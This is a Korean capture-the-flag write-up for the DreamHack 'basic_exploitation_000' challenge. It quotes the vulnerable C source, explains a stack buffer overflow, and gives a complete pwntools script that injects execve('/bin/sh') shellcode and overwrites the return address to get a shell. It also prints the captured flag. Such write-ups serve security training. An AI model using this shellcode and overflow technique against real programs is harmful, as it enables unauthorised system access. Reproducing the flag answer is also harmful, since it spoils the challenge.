# [DreamHack] basic_exploitation_000

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_000)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [basic_exploitation_000.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8537731/basic_exploitation_000.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159487430-702e96ca-1186-43a2-873d-24528098c343.png)

## Analysis

```c
int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```

`buf`의 크기보다 더 긴 입력을 줄 수 있어 BOF가 발생한다. `buf`에 셸코드를 입력하고 `main()`의 return address를 `buf`의 주소로 덮으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *
context(arch='i386')

REMOTE = True

if not REMOTE:
    r = process('./release/basic_exploitation_000')
else:
    r = remote('host1.dreamhack.games', 19778)

r.recvuntil('0x')
buf = int(r.recvline()[:-2], 16) # buf

shellcode = asm('''
xor ecx, ecx
xor edx, edx
xor eax, eax
mov al, 0x1b
sub al, 0x10
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
''')

payload = shellcode.ljust(0x84, b'\x90') + p32(buf)
r.sendline(payload)

r.interactive()
```

```
[+] Opening connection to host1.dreamhack.games on port 19778: Done
[*] Switching to interactive mode
$ cat flag
DH{465dd453b2a25a26a847a93d3695676d}
```
